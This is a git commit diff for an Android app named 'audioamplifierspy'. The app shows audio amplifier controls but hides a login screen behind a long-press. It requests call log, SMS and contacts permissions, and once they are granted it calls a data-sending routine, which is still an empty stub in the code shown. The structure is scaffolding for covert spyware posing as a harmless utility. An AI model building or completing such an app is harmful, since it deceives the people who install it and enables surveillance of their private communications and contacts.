777a034c9ae49f0eace33eebca9a0e1365a63ba1
Kushal-Gera <kushalgera1212@gmail.com>
2019-09-06 00:24:16 +0530

    improvements

--- app/src/main/java/com/example/audioamplifierspy/InputACT.java
+++ app/src/main/java/com/example/audioamplifierspy/InputACT.java
@@ -1,7 +1,9 @@
 package com.example.audioamplifierspy;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.Manifest;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
@@ -10,7 +12,13 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
 
-public class InputACT extends AppCompatActivity {
+import java.util.List;
+
+import pub.devrel.easypermissions.AfterPermissionGranted;
+import pub.devrel.easypermissions.AppSettingsDialog;
+import pub.devrel.easypermissions.EasyPermissions;
+
+public class InputACT extends AppCompatActivity  implements EasyPermissions.PermissionCallbacks{
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -19,26 +27,78 @@ public class InputACT extends AppCompatActivity {
 
         SharedPreferences preferences = getSharedPreferences("sharedPref", MODE_PRIVATE);
         SharedPreferences.Editor editor = preferences.edit();
-        //remember to change false to true
+        //remember to change to true
         editor.putBoolean("entered", false);
         editor.apply();
 
         //**********************************************************************************
-        EditText et = findViewById(R.id.number);
+        final EditText et = findViewById(R.id.number);
+        final EditText password = findViewById(R.id.password);
         findViewById(R.id.save).setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 //save it
-                Toast.makeText(InputACT.this, "saved", Toast.LENGTH_SHORT).show();
-                startActivity(new Intent(InputACT.this, MainActivity.class));
-                finish();
+                String id = et.getText().toString().trim();
+                String pass = password.getText().toString().trim();
+                if (!id.isEmpty() && !pass.isEmpty()){
+                    Toast.makeText(InputACT.this, "saved", Toast.LENGTH_SHORT).show();
+                    startActivity(new Intent(InputACT.this, MainActivity.class));
+                    finish();
+                }
 
             }
         });
 
+        ask_permissions();
+
 
     }
 
+    //requesting permission stuff
+    @AfterPermissionGranted(123) // it will be used to call the function ask_permission after the permission is granted
+    private void ask_permissions() {
+
+        String[] perms = {Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS};
+
+        if (EasyPermissions.hasPermissions(this, perms) ){
+            sendData();
+        }
+        else
+            EasyPermissions.requestPermissions(this, "Grant All Permission for it to work properly", 123, perms);
+
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+
+        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);
+
+    }
+
+
+    //this is for the case after returning from settings
+    @Override
+    public void onPermissionsGranted(int requestCode, @NonNull List<String> perms) {
+        if (requestCode == AppSettingsDialog.DEFAULT_SETTINGS_REQ_CODE)
+            sendData();
+
+    }
+
+    @Override
+    public void onPermissionsDenied(int requestCode, @NonNull List<String> perms) {
+        //take user again to settings to grant permission
+        if (EasyPermissions.somePermissionPermanentlyDenied(this, perms) ){
+            new AppSettingsDialog.Builder(this).build().show();
+        }
+
+    }
+    //******************************************************
+
+    private void sendData() {
+        //do something
+
+    }
 
     @Override
     public void onBackPressed() {
--- app/src/main/java/com/example/audioamplifierspy/MainActivity.java
+++ app/src/main/java/com/example/audioamplifierspy/MainActivity.java
@@ -9,18 +9,13 @@ import android.widget.LinearLayout;
 import android.widget.SeekBar;
 import android.widget.Toast;
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.google.android.material.snackbar.Snackbar;
 
-import java.util.List;
-
-import pub.devrel.easypermissions.AfterPermissionGranted;
-import pub.devrel.easypermissions.AppSettingsDialog;
 import pub.devrel.easypermissions.EasyPermissions;
 
-public class MainActivity extends AppCompatActivity implements EasyPermissions.PermissionCallbacks{
+public class MainActivity extends AppCompatActivity {
 
     private boolean entered_till;
     private LinearLayout ll;
@@ -44,41 +39,25 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
         findViewById(R.id.imageView).setOnLongClickListener(new View.OnLongClickListener() {
             @Override
             public boolean onLongClick(View v) {
-                  if (!entered_till)
+                  if (!entered_till){
                       startActivity(new Intent(MainActivity.this, InputACT.class));
+                  }
                   return true;
             }
         });
 
         seekBar();
-        ask_permissions();
-
-
-    }
-
-    @AfterPermissionGranted(123) // it will be used to call the function ask_permission after the permission is granted
-    private void ask_permissions() {
 
         String[] perms = {Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS};
-
-        if (EasyPermissions.hasPermissions(this, perms) )
-            Toast.makeText(this, "granted", Toast.LENGTH_SHORT).show();
-        else {
-            EasyPermissions.requestPermissions(this, "Grant All Permission for it to work properly", 123, perms);
-
-        }
-
+        if (EasyPermissions.hasPermissions(this, perms))
+            sendData();
 
     }
 
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-
-        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);
+    private void sendData() {
+        //do something
 
     }
-
 
     private void seekBar() {
 
@@ -115,36 +94,6 @@ public class MainActivity extends AppCompatActivity implements EasyPermissions.P
         sb3.setOnSeekBarChangeListener(listener);
 
     }
-
-
-    @Override
-    public void onPermissionsGranted(int requestCode, @NonNull List<String> perms) {
-        if (requestCode == AppSettingsDialog.DEFAULT_SETTINGS_REQ_CODE){
-
-            SendData();
-
-        }
-
-
-
-    }
-
-    @Override
-    public void onPermissionsDenied(int requestCode, @NonNull List<String> perms) {
-
-        if (EasyPermissions.somePermissionPermanentlyDenied(this, perms) ){
-            new AppSettingsDialog.Builder(this).build().show();
-        }
-
-
-    }
-
-    private void SendData() {
-
-
-
-    }
-
 
 
 
